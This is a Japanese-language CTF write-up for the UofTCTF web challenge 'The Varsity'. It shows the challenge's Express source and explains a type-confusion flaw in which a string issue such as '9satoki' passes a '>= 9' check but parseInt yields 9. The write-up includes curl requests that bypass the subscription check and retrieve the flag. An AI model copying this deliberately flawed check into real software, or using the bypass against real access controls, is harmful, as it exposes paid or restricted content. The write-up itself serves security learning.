# The Varsity:Web:293pts
Come read our newspaper! Be sure to subscribe if you want access to the entire catalogue, including the latest issue.  

`uoftctf-the-varsity.chals.io`  
[the_varsity.zip](the_varsity.zip)  

# Solution
URLとソースが与えられる。  
アクセスするとRegisterの後に指定した記事を閲覧できるサイトのようだ。  
![site.png](site/site.png)  
ソースを見ると主要部分は以下のようであった。  
```js
~~~
const FLAG = process.env.FLAG || "uoftctf{this_is_a_fake_flag}";
~~~

const JWT_SECRET = crypto.randomBytes(64).toString("hex");

const articles = [
  {
    "title": "Pioneering the Future: UofT's Revolutionary AI Research",
    "content": "The University of Toronto continues to lead groundbreaking research in artificial intelligence, with its latest project aiming to develop algorithms that can understand emotions in text. Spearheaded by a team of international students, this initiative promises to revolutionize how machines interact with human language."
  },
  {
    "title": "Engineering Triumph: UofT Students Build Record-Breaking Solar Car",
    "content": "A team of engineering students from the University of Toronto has broken international records with their latest solar-powered vehicle design. The car, named 'Solaris', is a testament to sustainable engineering and has won multiple awards in global competitions."
  },
  {
    "title": "UofT's Theatre Group Takes Centre Stage with Revolutionary Performance",
    "content": "The University of Toronto's theatre society has taken the art world by storm with its latest production, an innovative interpretation of Shakespeare's Hamlet. With a diverse cast and a unique, modern twist, the performance has garnered critical acclaim and a sold-out season."
  },
  {
    "title": "Medical Breakthrough: UofT Students Contribute to Cancer Research",
    "content": "In a significant stride towards fighting cancer, a group of biomedical students from the University of Toronto has contributed to major research findings. Their work focuses on a novel treatment approach that promises to reduce side effects and improve patient outcomes."
  },
  {
    "title": "Green Revolution: UofT's Commitment to Sustainability",
    "content": "The University of Toronto has launched a new initiative to make its campuses more sustainable. From reducing waste to promoting green technology, the university is dedicated to creating a better environment for students and the surrounding community."
  },
  {
    "title": "Cultural Mosaic: UofT's International Festival Highlights Global Unity",
    "content": "Celebrating diversity and unity, the University of Toronto's annual International Festival has once again brought together students from over 150 countries. The event featured cultural performances, food stalls, and interactive workshops, highlighting the rich cultural tapestry of the university's community."
  },
  {
    "title": "Tech Titans: UofT's Startup Accelerator Nurtures Next Generation Innovators",
    "content": "The University of Toronto's startup accelerator has become a hub for budding entrepreneurs. Offering mentorship, funding, and resources, the program has helped launch some of the most innovative tech companies in the country."
  },
  {
    "title": "Historic Discovery: UofT Archaeologists Unearth Ancient Artifacts",
    "content": "A team of archaeologists from the University of Toronto has made a historic discovery, unearthing ancient artifacts believed to be over 5,000 years old. This finding provides new insights into early human civilizations and has attracted international attention."
  },
  {
    "title": "Fitness First: UofT's New Wellness Program Promotes Student Health",
    "content": "With a focus on student well-being, the University of Toronto has introduced a comprehensive wellness program. Offering fitness classes, mental health resources, and nutritional guidance, the initiative aims to support the holistic health of all students."
  },
  {
    title: "UofT Hosts its 2nd Inaugural Capture the Flag Event",
    content: "Your flag is: " + FLAG,
  },
];

~~~

app.post("/register", (req, res) => {
  const { username, voucher } = req.body;

  if (
    typeof username === "string" &&
    (!voucher || typeof voucher === "string")
  ) {
    const subscription = voucher === FLAG + JWT_SECRET ? "premium" : "guest";
    if (voucher && subscription === "guest") {
      return res.status(400).json({ message: "Invalid voucher" });
    }
    const userToken = jwt.sign({ username, subscription }, JWT_SECRET, {
      expiresIn: "1d",
    });
    res.cookie("token", userToken, { httpOnly: true });
    return res.json({ message: "Registration successful", subscription });
  }

  return res.status(400).json({ message: "Invalid username or voucher" });
});

app.post("/article", (req, res) => {
  const token = req.cookies.token;

  if (token) {
    try {
      const decoded = jwt.verify(token, JWT_SECRET);

      let issue = req.body.issue;

      if (req.body.issue < 0) {
        return res.status(400).json({ message: "Invalid issue number" });
      }

      if (decoded.subscription !== "premium" && issue >= 9) {
        return res
          .status(403)
          .json({ message: "Please subscribe to access this issue" });
      }

      issue = parseInt(issue);

      if (Number.isNaN(issue) || issue > articles.length - 1) {
        return res.status(400).json({ message: "Invalid issue number" });
      }

      return res.json(articles[issue]);
    } catch (error) {
      res.clearCookie("token");
      return res.status(403).json({ message: "Not Authenticated" });
    }
  } else {
    return res.status(403).json({ message: "Not Authenticated" });
  }
});

app.listen(3000, () => {
  console.log("Server running on port 3000");
});
```
9番目の記事に`FLAG`が含まれているが、`guest`では読み取れない。  
`/register`へのリクエストで`voucher === FLAG + JWT_SECRET`を突破できれば`premium`となり9番目の記事を読み取れるが、`JWT_SECRET`はランダムであるため予測できない。  
ここで、`/article`で`issue >= 9`のチェックの後に`parseInt(issue)`している奇妙な実装に気づく。  
`issue`は`let issue = req.body.issue;`由来であるので文字列が入るにもかかわらず数値と比較している。  
文字列と数値の比較は以下のような挙動を示す。  
```bash
$ node
~~~
> "9" >= 9
true
> "10" >= 9
true
> "123abc" >= 9
false
> "satoki" >= 9
false
```
`>= 9`がfalseとなり`parseInt`で9となる文字列を送信してやればよさそうだ。  
ここでさらに、`parseInt`は数値で始まり、かつ途中に数値でない文字が来た場合にはそこまでを数値に変更することを思い出す。  
つまり、`parseInt("9satoki")`は9となる。  
これを送信すれば`>= 9`がfalseとなり`parseInt`で9となるため制限を突破できそうだ。  
```bash
$ curl -X POST https://uoftctf-the-varsity.chals.io/article -H 'Content-Type: application/json' -H 'Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlNhdG9raSIsInN1YnNjcmlwdGlvbiI6Imd1ZXN0IiwiaWF0IjoxNzA1MjI0ODkzLCJleHAiOjE3MDUzMTEyOTN9.AV2LZkuTGrMxybepTwPPtYKDjlY7G1f_8LR-k30bTIo' -d '{"issue":"9"}'
{"message":"Please subscribe to access this issue"}
$ curl -X POST https://uoftctf-the-varsity.chals.io/article -H 'Content-Type: application/json' -H 'Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlNhdG9raSIsInN1YnNjcmlwdGlvbiI6Imd1ZXN0IiwiaWF0IjoxNzA1MjI0ODkzLCJleHAiOjE3MDUzMTEyOTN9.AV2LZkuTGrMxybepTwPPtYKDjlY7G1f_8LR-k30bTIo' -d '{"issue":"9satoki"}'
{"title":"UofT Hosts its 2nd Inaugural Capture the Flag Event","content":"Your flag is: uoftctf{w31rd_b3h4v10r_0f_parseInt()!}"}
```
flagが得られた。  

## uoftctf{w31rd_b3h4v10r_0f_parseInt()!}